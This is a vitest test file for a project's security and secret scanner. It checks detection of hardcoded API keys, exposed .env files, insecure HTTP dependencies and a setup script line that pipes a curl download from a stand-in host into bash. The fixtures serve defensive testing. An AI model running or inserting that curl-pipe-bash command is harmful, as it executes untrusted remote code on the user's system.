import { mkdtemp, writeFile, readFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { safeRm } from "./test-helpers.js";
import { scanProjectSecurity, applySecurityFixes, formatSecurityReport } from "../src/core/security-scanner.js";

const temporaryDirectories: string[] = [];
async function createWorkspace(): Promise<string> {
  const directory = await mkdtemp(path.join(os.tmpdir(), "anvil-security-"));
  temporaryDirectories.push(directory);
  return directory;
}

afterEach(async () => {
  await Promise.all(temporaryDirectories.splice(0).map((directory) => safeRm(directory)));
});

describe("Repository Security & Secret Scanner", () => {
  it("detects clean project with no findings", async () => {
    const ws = await createWorkspace();
    await writeFile(path.join(ws, "index.ts"), "export const hello = 'world';\n");
    const report = await scanProjectSecurity(ws);
    expect(report.passed).toBe(true);
    expect(report.findings).toHaveLength(0);
    expect(formatSecurityReport(report)).toContain("Clean pass");
  });

  it("detects hardcoded OpenAI and Anthropic keys and masks snippets", async () => {
    const ws = await createWorkspace();
    await writeFile(
      path.join(ws, "keys.ts"),
      "const openai = 'sk-proj-999aaabbbcccdddeeefffggg12345';\nconst anthropic = 'sk-ant-999aaabbbcccdddeeefffggg12345';\n"
    );
    const report = await scanProjectSecurity(ws);
    expect(report.passed).toBe(false);
    expect(report.summary.critical).toBeGreaterThanOrEqual(1);
    const rules = report.findings.map((f) => f.rule);
    expect(rules).toContain("openai-api-key");
    const openaiFinding = report.findings.find((f) => f.rule === "openai-api-key");
    expect(openaiFinding?.snippet).not.toBe("sk-proj-999aaabbbcccdddeeefffggg12345");
    expect(openaiFinding?.snippet).toContain("...");
  });

  it("detects dangerous script patterns like curl | bash", async () => {
    const ws = await createWorkspace();
    await writeFile(path.join(ws, "setup.sh"), "#!/bin/bash\ncurl -fsSL https://untrusted.site/install.sh | bash\n");
    const report = await scanProjectSecurity(ws);
    expect(report.findings.some((f) => f.rule === "curl-pipe-bash")).toBe(true);
  });

  it("detects exposed .env files and auto-fixes by adding to .gitignore", async () => {
    const ws = await createWorkspace();
    await writeFile(path.join(ws, ".env"), "SECRET_TOKEN=xyz987654321\n");
    const report = await scanProjectSecurity(ws);
    expect(report.findings.some((f) => f.rule === "exposed-env-file")).toBe(true);

    const fixResult = await applySecurityFixes(ws, report.findings);
    expect(fixResult.fixedCount).toBeGreaterThan(0);

    const gitignore = await readFile(path.join(ws, ".gitignore"), "utf8");
    expect(gitignore).toContain(".env");

    const rescan = await scanProjectSecurity(ws);
    expect(rescan.findings.some((f) => f.rule === "exposed-env-file")).toBe(false);
  });

  it("detects insecure HTTP dependencies in package.json", async () => {
    const ws = await createWorkspace();
    await writeFile(
      path.join(ws, "package.json"),
      JSON.stringify({
        dependencies: {
          "risky-pkg": "http://insecure-host.com/pkg.tgz",
        },
      })
    );
    const report = await scanProjectSecurity(ws);
    expect(report.findings.some((f) => f.rule === "insecure-http-dependency")).toBe(true);
  });
});
